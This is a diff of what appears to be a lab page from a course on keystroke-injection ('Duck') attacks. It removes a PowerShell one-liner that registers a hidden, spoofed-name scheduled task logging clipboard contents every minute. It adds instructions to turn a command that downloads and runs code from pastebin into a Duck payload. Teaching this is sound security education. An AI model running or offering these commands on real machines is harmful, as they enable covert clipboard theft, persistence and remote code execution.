@@ -1,1 +1,16 @@
-$action=New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "gcb | Out-File -FilePath ''C:\Temp\totallylegit.txt'' -Append"'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650); Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Offishual_MikeRoShaft_Task' -Description 'We clean your windows real good'
+---
+layout: default
+title: Dangerous(2)
+nav_order: 55
+---
+
+In our labs, we sent data to pastebin. But what if we used pastebin (or github) to host our malicious code?!
+Duckify this powershell command:
+```powershell
+iex((iwr http://pastebin.com/raw.php?i=sWacjDpa).content)
+```
+But before you do. 
+
+PLEASE LOOK AT THE CODE AND UNDERSTAND IT!
+
+Always be vigilant!
